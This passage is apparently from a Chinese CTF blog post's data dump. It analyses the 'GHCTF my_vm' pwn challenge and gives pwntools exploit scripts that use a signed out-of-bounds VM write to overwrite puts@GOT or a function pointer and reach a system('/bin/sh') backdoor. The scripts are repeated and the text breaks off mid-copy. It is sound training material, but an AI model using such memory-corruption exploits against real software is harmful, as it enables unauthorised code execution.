class=\"number\">24</span>)+(dest&lt;&lt;<span class=\"number\">16</span>)+(src1&lt;&lt;<span class=\"number\">8</span>)+src2</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(code))</span><br><span class=\"line\"></span><br><span class=\"line\">backdoor=<span class=\"number\">0x400877</span> <span class=\"comment\"># system(&quot;/bin/sh\\x00&quot;)</span></span><br><span class=\"line\"></span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">&quot;set your IP:&quot;</span>,<span class=\"string\">&quot;0&quot;</span>)</span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">&quot;set your SP:&quot;</span>,<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">&quot;execve:&quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">27</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">puts_got=<span class=\"number\">0x602018</span></span><br><span class=\"line\">offset=<span class=\"number\">0x6020e0</span>-<span class=\"number\">0x602018</span></span><br><span class=\"line\">reg=<span class=\"number\">0x6420E0</span></span><br><span class=\"line\">memory=<span class=\"number\">0x6020E0</span></span><br><span class=\"line\"><span class=\"comment\">###</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">###</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">### Code </span></span><br><span class=\"line\">Code(<span class=\"number\">0x10</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0x8</span>)  <span class=\"comment\"># reg[0]=0x8</span></span><br><span class=\"line\">Code(<span class=\"number\">0x10</span>,<span class=\"number\">1</span>,<span class=\"number\">0</span>,<span class=\"number\">0x4</span>)  <span class=\"comment\"># reg[1]=0x4</span></span><br><span class=\"line\">Code(<span class=\"number\">0x40</span>,<span class=\"number\">2</span>,<span class=\"number\">1</span>,<span class=\"number\">0</span>)    <span class=\"comment\"># reg[2]=0xc</span></span><br><span class=\"line\">Code(<span class=\"number\">0x80</span>,<span class=\"number\">3</span>,<span class=\"number\">2</span>,<span class=\"number\">1</span>)    <span class=\"comment\"># reg[3]=reg[1]&lt;&lt;reg[1]  : reg[3]=0xc0</span></span><br><span class=\"line\">Code(<span class=\"number\">0x10</span>,<span class=\"number\">4</span>,<span class=\"number\">0</span>,<span class=\"number\">0x6</span>)  <span class=\"comment\"># reg[4]=0x6</span></span><br><span class=\"line\">Code(<span class=\"number\">0x40</span>,<span class=\"number\">4</span>,<span class=\"number\">4</span>,<span class=\"number\">0</span>)    <span class=\"comment\"># reg[4]=0xe</span></span><br><span class=\"line\">Code(<span class=\"number\">0x40</span>,<span class=\"number\">3</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>)    <span class=\"comment\"># reg[1]=reg[1]+reg[3]   : reg[3]=0xce      </span></span><br><span class=\"line\">Code(<span class=\"number\">0x10</span>,<span class=\"number\">5</span>,<span class=\"number\">0</span>,<span class=\"number\">0x7</span>)  <span class=\"comment\"># reg[5]=0x7</span></span><br><span class=\"line\">Code(<span class=\"number\">0x40</span>,<span class=\"number\">5</span>,<span class=\"number\">5</span>,<span class=\"number\">0</span>)    <span class=\"comment\"># reg[5]=0xf</span></span><br><span class=\"line\">Code(<span class=\"number\">0x80</span>,<span class=\"number\">6</span>,<span class=\"number\">5</span>,<span class=\"number\">1</span>)    <span class=\"comment\"># reg[6]=reg[5]&lt;&lt;reg[1]  : reg[6]=0xf0</span></span><br><span class=\"line\">Code(<span class=\"number\">0x40</span>,<span class=\"number\">6</span>,<span class=\"number\">6</span>,<span class=\"number\">5</span>)    <span class=\"comment\"># reg[6]=reg[5]+reg[6]   : reg[6]=0xff </span></span><br><span class=\"line\">Code(<span class=\"number\">0x80</span>,<span class=\"number\">5</span>,<span class=\"number\">6</span>,<span class=\"number\">0</span>)    <span class=\"comment\"># reg[5]=reg[6]&lt;&lt;reg[0]  : reg[5]=0xff00</span></span><br><span class=\"line\">Code(<span class=\"number\">0x40</span>,<span class=\"number\">5</span>,<span class=\"number\">5</span>,<span class=\"number\">6</span>)    <span class=\"comment\"># reg[5]=reg[5]+reg[6]   : reg[5]=0xffff</span></span><br><span class=\"line\">Code(<span class=\"number\">0x80</span>,<span class=\"number\">5</span>,<span class=\"number\">5</span>,<span class=\"number\">0</span>)    <span class=\"comment\"># reg[5]=reg[5]&lt;&lt;reg[0]  : reg[5]=0xffff00</span></span><br><span class=\"line\">Code(<span class=\"number\">0x40</span>,<span class=\"number\">5</span>,<span class=\"number\">5</span>,<span class=\"number\">6</span>)    <span class=\"comment\"># reg[5]=reg[5]+reg[6]   : reg[5]=0xffffff</span></span><br><span class=\"line\">Code(<span class=\"number\">0x80</span>,<span class=\"number\">5</span>,<span class=\"number\">5</span>,<span class=\"number\">0</span>)    <span class=\"comment\"># reg[5]=reg[5]&lt;&lt;reg[0]  : reg[5]=0xffffff00</span></span><br><span class=\"line\">Code(<span class=\"number\">0x40</span>,<span class=\"number\">5</span>,<span class=\"number\">5</span>,<span class=\"number\">3</span>)    <span class=\"comment\"># reg[5]=reg[5]+reg[3]   : reg[5]=0xffffffce</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#0x400877</span></span><br><span class=\"line\">Code(<span class=\"number\">0x10</span>,<span class=\"number\">4</span>,<span class=\"number\">0</span>,<span class=\"number\">0x7</span>)  <span class=\"comment\"># reg[4]=0x7</span></span><br><span class=\"line\">Code(<span class=\"number\">0x80</span>,<span class=\"number\">6</span>,<span class=\"number\">4</span>,<span class=\"number\">1</span>)    <span class=\"comment\"># reg[6]=reg[4]&lt;&lt;reg[1]  : reg[6]=0x70</span></span><br><span class=\"line\">Code(<span class=\"number\">0x40</span>,<span class=\"number\">6</span>,<span class=\"number\">6</span>,<span class=\"number\">4</span>)    <span class=\"comment\"># reg[6]=reg[6]+reg[4]   : reg[6]=0x770000</span></span><br><span class=\"line\">Code(<span class=\"number\">0x80</span>,<span class=\"number\">1</span>,<span class=\"number\">1</span>,<span class=\"number\">1</span>)    <span class=\"comment\"># reg[1]=reg[1]&lt;&lt;reg[1]  : reg[1]=0x40</span></span><br><span class=\"line\">Code(<span class=\"number\">0x80</span>,<span class=\"number\">1</span>,<span class=\"number\">1</span>,<span class=\"number\">0</span>)    <span class=\"comment\"># reg[1]=reg[1]&lt;&lt;reg[0]  : reg[1]=0x4000</span></span><br><span class=\"line\">Code(<span class=\"number\">0x80</span>,<span class=\"number\">1</span>,<span class=\"number\">1</span>,<span class=\"number\">0</span>)    <span class=\"comment\"># reg[1]=reg[1]&lt;&lt;reg[0]  : reg[1]=0x400000</span></span><br><span class=\"line\">Code(<span class=\"number\">0x80</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>)    <span class=\"comment\"># reg[0]=reg[0]&lt;&lt;reg[0]  : reg[0]=0x800</span></span><br><span class=\"line\">Code(<span class=\"number\">0x40</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">6</span>)    <span class=\"comment\"># reg[0]=reg[0]+reg[6]   : reg[0]=0x877</span></span><br><span class=\"line\">Code(<span class=\"number\">0x40</span>,<span class=\"number\">1</span>,<span class=\"number\">1</span>,<span class=\"number\">0</span>)    <span class=\"comment\"># reg[1]=reg[1]+reg[0]   : reg[1]=0x4000877</span></span><br><span class=\"line\">Code(<span class=\"number\">0x90</span>,<span class=\"number\">5</span>,<span class=\"number\">1</span>,<span class=\"number\">0</span>)    <span class=\"comment\"># mem[reg[5]]=reg[1]     : mem[-50]=0x4000877</span></span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(io)</span></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"覆盖func\"><a href=\"#覆盖func\" class=\"headerlink\" title=\"覆盖func\"></a>覆盖func</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> libcfind <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context(os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>,log_level=<span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\">mode=<span class=\"number\">0</span></span><br><span class=\"line\">url=<span class=\"string\">&#x27;node1.anna.nssctf.cn&#x27;</span></span><br><span class=\"line\">port=<span class=\"number\">28844</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&quot;./my_vm&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">if</span> mode == <span class=\"number\">0</span>:</span><br><span class=\"line\">    io=process(<span class=\"string\">&quot;./my_vm&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">else</span> :</span><br><span class=\"line\">    io=remote(url,port)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">Code</span>(<span class=\"params\">op,dest,src1,src2</span>):</span><br><span class=\"line\">    code=(op&lt;&lt;<span class=\"number\">24</span>)+(dest&lt;&lt;<span class=\"number\">16</span>)+(src1&lt;&lt;<span class=\"number\">8</span>)+src2</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(code))</span><br><span class=\"line\"></span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">&quot;set your IP:&quot;</span>,<span class=\"string\">&quot;0&quot;</span>)</span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">&quot;set your SP:&quot;</span>,<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">&quot;execve:&quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">14</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">### Code </span></span><br><span class=\"line\">Code(<span class=\"number\">0x10</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">8</span>)   <span class=\"comment\">#reg[0]=8</span></span><br><span class=\"line\">Code(<span class=\"number\">0x10</span>,<span class=\"number\">1</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\">Code(<span class=\"number\">0x50</span>,<span class=\"number\">1</span>,<span class=\"number\">1</span>,<span class=\"number\">0</span>)   <span class=\"comment\">#reg[1]=-8</span></span><br><span class=\"line\">Code(<span class=\"number\">0x10</span>,<span class=\"number\">2</span>,<span class=\"number\">0</span>,<span class=\"number\">7</span>)   <span class=\"comment\">#reg[2]=7</span></span><br><span class=\"line\">Code(<span class=\"number\">0x10</span>,<span class=\"number\">4</span>,<span class=\"number\">0</span>,<span class=\"number\">4</span>)   <span class=\"comment\">#reg[4]=4</span></span><br><span class=\"line\">Code(<span class=\"number\">0x80</span>,<span class=\"number\">3</span>,<span class=\"number\">2</span>,<span class=\"number\">4</span>)   <span class=\"comment\">#reg[3]=0x70</span></span><br><span class=\"line\">Code(<span class=\"number\">0x40</span>,<span class=\"number\">3</span>,<span class=\"number\">3</span>,<span class=\"number\">2</span>)   <span class=\"comment\">#reg[3]=0x77</span></span><br><span class=\"line\"><span class=\"comment\">### backdoor  </span></span><br><span class=\"line\">Code(<span class=\"number\">0x80</span>,<span class=\"number\">4</span>,<span class=\"number\">4</span>,<span class=\"number\">4</span>)   <span class=\"comment\">#reg[4]=0x40</span></span><br><span class=\"line\">Code(<span class=\"number\">0x80</span>,<span class=\"number\">4</span>,<span class=\"number\">4</span>,<span class=\"number\">0</span>)   <span class=\"comment\">#reg[4]=0x4000</span></span><br><span class=\"line\">Code(<span class=\"number\">0x80</span>,<span class=\"number\">4</span>,<span class=\"number\">4</span>,<span class=\"number\">0</span>)   <span class=\"comment\">#reg[4]=0x400000</span></span><br><span class=\"line\">Code(<span class=\"number\">0x80</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>)   <span class=\"comment\">#reg[0]=0x800</span></span><br><span class=\"line\">Code(<span class=\"number\">0x40</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">3</span>)   <span class=\"comment\">#reg[0]=0x877</span></span><br><span class=\"line\">Code(<span class=\"number\">0x40</span>,<span class=\"number\">4</span>,<span class=\"number\">4</span>,<span class=\"number\">0</span>)   <span class=\"comment\">#reg[4]=0x400877</span></span><br><span class=\"line\">Code(<span class=\"number\">0x90</span>,<span class=\"number\">1</span>,<span class=\"number\">4</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\">io.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>","excerpt":"","more":"<h1 id=\"GHCTF-my-vm\"><a href=\"#GHCTF-my-vm\" class=\"headerlink\" title=\"GHCTF my_vm\"></a>GHCTF my_vm</h1><h2 id=\"ida分析\"><a href=\"#ida分析\" class=\"headerlink\" title=\"ida分析\"></a>ida分析</h2><h3 id=\"main函数分析\"><a href=\"#main函数分析\" class=\"headerlink\" title=\"main函数分析\"></a>main函数分析</h3><p><img src=\"https://img.picui.cn/free/2025/03/07/67cad4a470919.png\" alt=\"3f01387abe8311ab1b7074076d401f21.png\"></p>\n<p>1.存在backdoor()函数，点开发现system(“&#x2F;bin&#x2F;sh\\x00”).可以直接利用这个地址0x400877.<br>2.funcptr会调用my_print,如果可以修改my_print 为backdoor。那就很完美了<br>3.memory中保存着我们的指令，execute 会按序执行我们的指令，查看这个函数。</p>\n<h3 id=\"execute函数分析\"><a href=\"#execute函数分析\" class=\"headerlink\" title=\"execute函数分析\"></a>execute函数分析</h3><p><img src=\"https://img.picui.cn/free/2025/03/07/67cad6af01ff1.png\" alt=\"ce03e0db0dc58c5804e54f85fa17415e.png\"><br><img src=\"https://img.picui.cn/free/2025/03/07/67cad6aee4df5.png\" alt=\"13ff0390c00c30152ec7d6fa2c06df9c.png\"><br><img src=\"https://img.picui.cn/free/2025/03/07/67cad7ed8076c.png\" alt=\"607b380e75b4290a943509c3c299364c.png\"><br>1.首先看，对op的处理，和对op的限制<br>2.寻找漏洞。option &#x3D;&#x3D; 0x90 时，可以对memory上的数据作修改<br>3.基于此，如果<code>reg[dest]</code>设置为负数，那么可以完成对其他数据的修改<br>4.从第三张图，查看option&#x3D;&#x3D;0x90 时的汇编，发现赋值指令是movzx(有符号低扩展为有符号高)，所以可以在<code>reg[]</code>中写入负数，完成数组的向上越界</p>\n<h2 id=\"构造思路\"><a href=\"#构造思路\" class=\"headerlink\" title=\"构造思路\"></a>构造思路</h2><p>1.首先是，ip和sp。ip从0开始，也就从我们读入的第一个指令执行。sp设置为1，大于0就行<br>2.接着读入op。我们需要对op作一点处理，便于控制每一个字节</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">Code</span>(<span class=\"params\">op,dest,src1,src2</span>):</span><br><span class=\"line\">    code=(op&lt;&lt;<span class=\"number\">24</span>)+(dest&lt;&lt;<span class=\"number\">16</span>)+(src1&lt;&lt;<span class=\"number\">8</span>)+src2</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(code))</span><br></pre></td></tr></table></figure>\n<p>通过样的处理，我们可以控制每个字节，便于准确的控制<br>3.需要找到要覆盖的目标地址，dest_addr. 这一题中可以覆盖func的内容为backdoor.另外，常见的手法可以覆盖got表内容为backdoor .此题中我采用了后者的方法<br>4.计算对应dest_addr的偏移，这里从汇编中可以看出来，此题中的memory和reg均是以rax*4 来寻址。可知，均是4字节数组.所以对应偏移需要除以4，才能被数组寻到<br>5.得到偏移之后，利用0x90控制数据，注意到，数据会被改写为src1.因此，在调用前需要将某个reg内写入我们的backdoor<br>6.最后，因为我们不能直接往reg里写入任意数据，有字节和大小的限制。所以我们需要通过题目提供的运算操作，一步一步修改内容.</p>\n<h2 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h2><h3 id=\"修改puts-got\"><a href=\"#修改puts-got\" class=\"headerlink\" title=\"修改puts_got\"></a>修改puts_got</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> libcfind <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context(os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>,log_level=<span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\">mode=<span class=\"number\">1</span></span><br><span class=\"line\">url=<span class=\"string\">&#x27;node1.anna.nssctf.cn&#x27;</span></span><br><span class=\"line\">port=<span class=\"number\">28844</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&quot;./my_vm&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">if</span> mode == <span class=\"number\">0</span>:</span><br><span class=\"line\">    io=process(<span class=\"string\">&quot;./my_vm&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">else</span> :</span><br><span class=\"line\">    io=remote(url,port)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">Code</span>(<span class=\"params\">op,dest,src1,src2</span>):</span><br><span class=\"line\">    code=(op&lt;&lt;<span class=\"number\">24</span>)+(dest&lt;&lt;<span class=\"number\">16</span>)+(src1&lt;&lt;<span class=\"number\">8</span>)+src2</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(code))</span><br><span class=\"line\"></span><br><span class=\"line\">backdoor=<span class=\"number\">0x400877</span> <span class=\"comment\"># system(&quot;/bin/sh\\x00&quot;)</span></span><br><span class=\"line\"></span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">&quot;set your IP:&quot;</span>,<span class=\"string\">&quot;0&quot;</span>)</span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">&quot;set your SP:&quot;</span>,<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">&quot;execve:&quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">27</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">puts_got=<span class=\"number\">0x602018</span></span><br><span class=\"line\">offset=<span class=\"number\">0x6020e0</span>-<span class=\"number\">0x602018</span></span><br><span class=\"line\">reg=<span class=\"number\">0x6420E0</span></span><br><span class=\"line\">memory=<span class=\"number\">0x6020E0</span></span><br><span class=\"line\"><span class=\"comment\">###</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">###</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">### Code </span></span><br><span class=\"line\">Code(<span class=\"number\">0x10</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0x8</span>)  <span class=\"comment\"># reg[0]=0x8</span></span><br><span class=\"line\">Code(<span class=\"number\">0x10</span>,<span class=\"number\">1</span>,<span class=\"number\">0</span>,<span class=\"number\">0x4</span>)  <span class=\"comment\"># reg[1]=0x4</span></span><br><span class=\"line\">Code(<span class=\"number\">0x40</span>,<span class=\"number\">2</span>,<span class=\"number\">1</span>,<span class=\"number\">0</span>)    <span class=\"comment\"># reg[2]=0xc</span></span><br><span class=\"line\">Code(<span class=\"number\">0x80</span>,<span class=\"number\">3</span>,<span class=\"number\">2</span>,<span class=\"number\">1</span>)    <span class=\"comment\"># reg[3]=reg[1]&lt;&lt;reg[1]  : reg[3]=0xc0</span></span><br><span class=\"line\">Code(<span class=\"number\">0x10</span>,<span class=\"number\">4</span>,<span class=\"number\">0</span>,<span class=\"number\">0x6</span>)  <span class=\"comment\"># reg[4]=0x6</span></span><br><span class=\"line\">Code(<span class=\"number\">0x40</span>,<span class=\"number\">4</span>,<span class=\"number\">4</span>,<span class=\"number\">0</span>)    <span class=\"comment\"># reg[4]=0xe</span></span><br><span class=\"line\">Code(<span class=\"number\">0x40</span>,<span class=\"number\">3</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>)    <span class=\"comment\"># reg[1]=reg[1]+reg[3]   : reg[3]=0xce      </span></span><br><span class=\"line\">Code(<span class=\"number\">0x10</span>,<span class=\"number\">5</span>,<span class=\"number\">0</span>,<span class=\"number\">0x7</span>)  <span class=\"comment\"># reg[5]=0x7</span></span><br><span class=\"line\">Code(<span class=\"number\">0x40</span>,<span class=\"number\">5</span>,<span class=\"number\">5</span>,<span class=\"number\">0</span>)    <span class=\"comment\"># reg[5]=0xf</span></span><br><span class=\"line\">Code(<span class=\"number\">0x80</span>,<span class=\"number\">6</span>,<span class=\"number\">5</span>,<span class=\"number\">1</span>)    <span class=\"comment\"># reg[6]=reg[5]&lt;&lt;reg[1]  : reg[6]=0xf0</span></span><br><span class=\"line\">Code(<span class=\"number\">0x40</span>,<span class=\"number\">6</span>,<span class=\"number\">6</span>,<span class=\"number\">5</span>)    <span class=\"comment\"># reg[6]=reg[5]+reg[6]   : reg[6]=0xff </span></span><br><span class=\"line\">Code(<span class=\"number\">0x80</span>,<span class=\"number\">5</span>,<span class=\"number\">6</span>,<span class=\"number\">0</span>)    <span class=\"comment\"># reg[5]=reg[6]&lt;&lt;reg[0]  : reg[5]=0xff00</span></span><br><span class=\"line\">Code(<span class=\"number\">0x40</span>,<span class=\"number\">5</span>,<span class=\"number\">5</span>,<span class=\"number\">6</span>)    <span class=\"comment\"># reg[5]=reg[5]+reg[6]   : reg[5]=0xffff</span></span><br><span class=\"line\">Code(<span class=\"number\">0x80</span>,<span class=\"number\">5</span>,<span class=\"number\">5</span>,<span class=\"number\">0</span>)    <span class=\"comment\"># reg[5]=reg[5]&lt;&lt;reg[0]  : reg[5]=0xffff00</span></span><br><span class=\"line\">Code(<span class=\"number\">0x40</span>,<span class=\"number\">5</span>,<span class=\"number\">5</span>,<span class=\"number\">6</span>)    <span class=\"comment\"># reg[5]=reg[5]+reg[6]   : reg[5]=0xffffff</span></span><br><span class=\"line\">Code(<span class=\"number\">0x80</span>,<span class=\"number\">5</span>,<span class=\"number\">5</span>,<span class=\"number\">0</span>)    <span class=\"comment\"># reg[5]=reg[5]&lt;&lt;reg[0]  : reg[5]=0xffffff00</span></span><br><span class=\"line\">Code(<span class=\"number\">0x40</span>,<span class=\"number\">5</span>,<span class=\"number\">5</span>,<span class=\"number\">3</span>)    <span class=\"comment\"># reg[5]=reg[5]+reg[3]   : reg[5]=0xffffffce</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#0x400877</span></span><br><span class=\"line\">Code(<span class=\"number\">0x10</span>,<span class=\"number\">4</span>,<span class=\"number\">0</span>,<span class=\"number\">0x7</span>)  <span class=\"comment\"># reg[4]=0x7</span></span><br><span class=\"line\">Code(<span class=\"number\">0x80</span>,<span class=\"number\">6</span>,<span class=\"number\">4</span>,<span class=\"number\">1</span>)    <span class=\"comment\"># reg[6]=reg[4]&lt;&lt;reg[1]  : reg[6]=0x70</span></span><br><span class=\"line\">Code(<span class=\"number\">0x40</span>,<span class=\"number\">6</span>,<span class=\"number\">6</span>,<span class=\"number\">4</span>)    <span class=\"comment\"># reg[6]=reg[6]+reg[4]   : reg[6]=0x770000</span></span><br><span class=\"line\">Code(<span class=\"number\">0x80</span>,<span class=\"number\">1</span>,<span class=\"number\">1</span>,<span class=\"number\">1</span>)    <span class=\"comment\"># reg[1]=reg[1]&lt;&lt;reg[1]  : reg[1]=0x40</span></span><br><span class=\"line\">Code(<span class=\"number\">0x80</span>,<span class=\"number\">1</span>,<span class=\"number\">1</span>,<span class=\"number\">0</span>)    <span class=\"comment\"># reg[1]=reg[1]&lt;&lt;reg[0]  : reg[1]=0x4000</span></span><br><span class=\"line\">Code(<span class=\"number\">0x80</span>,<span class=\"number\">1</span>,<span class=\"number\">1</span>,<span class=\"number\">0</span>)    <span class=\"comment\"># reg[1]=reg[1]&lt;&lt;reg[0]  : reg[1]=0x400000</span></span><br><span class=\"line\">Code(<span class=\"number\">0x80</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>)    <span class=\"comment\"># reg[0]=reg[0]&lt;&lt;reg[0]  : reg[0]=0x800</span></span><br><span class=\"line\">Code(<span class=\"number\">0x40</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">6</span>)    <span class=\"comment\"># reg[0]=reg[0]+reg[6]   : reg[0]=0x877</span></span><br><span class=\"line\">Code(<span class=\"number\">0x40</span>,<span class=\"number\">1</span>,<span class=\"number\">1</span>,<span class=\"number\">0</span>)    <span class=\"comment\"># reg[1]=reg[1]+reg[0]   : reg[1]=0x4000877</span></span><br><span class=\"line\">Code(<span class=\"number\">0x90</span>,<span class=\"number\">5</span>,<span class=\"number\">1</span>,<span class=\"number\">0</span>)    <span class=\"comment\"># mem[reg[5]]=reg[1]     : mem[-50]=0x4000877</span></span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(io)</span></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"覆盖func\"><a href=\"#覆盖func\" class=\"headerlink\" title=\"覆盖func\"></a>覆盖func</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span 